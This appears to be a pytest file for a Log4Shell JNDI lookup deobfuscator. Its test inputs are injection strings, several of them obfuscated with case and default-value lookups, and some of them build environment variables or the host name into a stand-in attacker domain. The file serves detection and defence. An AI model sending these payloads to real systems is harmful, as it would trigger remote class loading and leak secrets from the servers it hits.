import pytest

#from jndi_deobfuscate import jndi_deobfuscate
from src.jndi_deobfuscate.jndi_deobfuscate import (
    does_it_meet_the_bare_minimum_checks_for_java_lookups,
    process_line,
)


@pytest.mark.parametrize(
    "input_string, expected_output",
    [
        (r"$jndi{test}", False),  # missing start brace and colon
        (r"$jndi:{test}", False),  # missing start brace
        (r"$jndi{test}}", False),  # missing start brace, extra end brace, no colon
        (r"${jndi:test", False),  # missing end brace
        (
            r"${jndi{test}}",
            False,
        ),  # no colon, extra brace -- but we are not checking for valid URLs here
        # normal urls:
        (r"${jndi:ldap://example.com/maliciouspayload}", True),
        (r"${jndi:iiop://example.com/maliciouspayload/?query_string=infected_hostname}", True),
        (r"${jndi:dns://example.com/maliciouspayload}", True),
        # with upper/lower, variables
        (r"${jndi:${lower:d}ns:/example.com/x}", True),
        (r"${jndi:${lower:d}ns:/example.com/${env:DB_USERNAME}}", True),
        (
            r"${jndi:${lower:d}ns:/example.com/${env:DB_USERNAME}}?query_string=infected_hostname",
            True,
        ),
        # with default values for unresolved vars
        (
            r"${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://VAR_HOSTNAME.ref.afgasdas1fdasdas.example.com}",
            True,
        ),
        (
            r"${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://VAR_HOSTNAME.ref.afgasdas1fdasdas.example.com}",
            True,
        ),  # unaligned curley brace
        (
            r"${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://VAR_HOSTNAME.ref.afgasdas1fdasdas.example.com/?query_string=infected_hostname}",
            True,
        ),  # unaligned curley brace
    ],
)
def test_does_it_meet_the_bare_minimum_checks_for_java_lookups(input_string, expected_output):
    processed = does_it_meet_the_bare_minimum_checks_for_java_lookups(input_string)
    assert processed == expected_output


@pytest.mark.parametrize(
    "input_string, expected_output",
    [
        (r"$jndi{test}", None),  # missing start brace and colon
        (r"$jndi:{test}", None),  # missing start brace
        (r"$jndi{test}}", None),  # missing start brace, extra end brace
        (r"${jndi:test", None),  # missing end brace
        (r"${jndi:{test}}", None),
        # normal urls:
        (
            r"${jndi:ldap://example.com/maliciouspayload}",
            r"${jndi:ldap://example.com/maliciouspayload}",
        ),
        (
            r"${jndi:iiop://example.com/maliciouspayload/?query_string=infected_hostname}",
            r"${jndi:iiop://example.com/maliciouspayload/?query_string=infected_hostname}",
        ),
        (
            r"${jndi:dns://example.com/maliciouspayload}",
            r"${jndi:dns://example.com/maliciouspayload}",
        ),
        # with upper/lower single characters, known variables
        (r"${jndi:${lower:d}ns://example.com/x}", r"${jndi:dns://example.com/x}"),
        (r"${jndi:${lower:d}ns://example.com/${upper:a}}", r"${jndi:dns://example.com/A}"),
        (
            r"${jndi:${lower:d}ns://example.com/${env:DB_USERNAME}}?query_string=infected_hostname",
            r"${jndi:dns://example.com/ENV_DB_USERNAME}",
        ),
        # with upper/lowercase multichar:
        (r"${jndi:${lower:dns}://example.com/x}", r"${jndi:dns://example.com/x}"),
        (r"${jndi:${upper:dNS}://example.com/${upper:e}}", r"${jndi:DNS://example.com/E}"),
        # with default values for unresolved vars
        (
            r"${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}${::-:}//${env:DB_USERNAME}.ref.afgasdas1fdasdas.example.com}",
            r"${jNDi:ldap://ENV_DB_USERNAME.ref.afgasdas1fdasdas.example.com}",
        ),
        (
            r"${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://${hostNAME}.ref.afgasdas1fdasdas.example.com}",
            r"${jNDi:ldap://VAR_HOSTNAME.ref.afgasdas1fdasdas.example.com}",
        ),  # unaligned curley brace
        (
            r"${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://${hostname}.ref.afgasdas1fdasdas.example.com/?query_string=infected_hostname}",
            r"${jNDi:ldap://VAR_HOSTNAME.ref.afgasdas1fdasdas.example.com/?query_string=infected_hostname}",
        ),
        # date lookups
        (
            r"${jndi:ldap://${date:yyyy-mm-dd}.example.com/path}",
            r"${jndi:ldap://DATE_LOOKUP.example.com/path}",
        ),
        # extra data after JNDI:
        (
            r'${jndi:dns://1.2.3.4/securityscan-https443}"}, {"field": "RemoteIpAddress", "value": "5.5.5.5"}, {"field": "RemoteIpAddressSequence", "value": "2.2.2.2"}, {"field": "Operation", "value": "Unknown"}',
            r"${jndi:dns://1.2.3.4/securityscan-https443}",
        ),
        # garbled data:
        (
            r"        ${Y~06^F+Ò­Ì·^F\E^F>E'+9NgÞ¯|OLÉ¯     ^E2^F^\B7^^X^OQ%ro^@x,M^T|^P4^Kh:^SÉ¦w2^XjYx^XGH^FQ^_ESC^        ^V3Ã´3w^A Ú ^EE;Y.Kef^VØ¶:x}",
            None,
        ),
    ],
)
def test_process_line(input_string, expected_output):
    processed = process_line(input_string, print_output=False)
    assert processed == expected_output
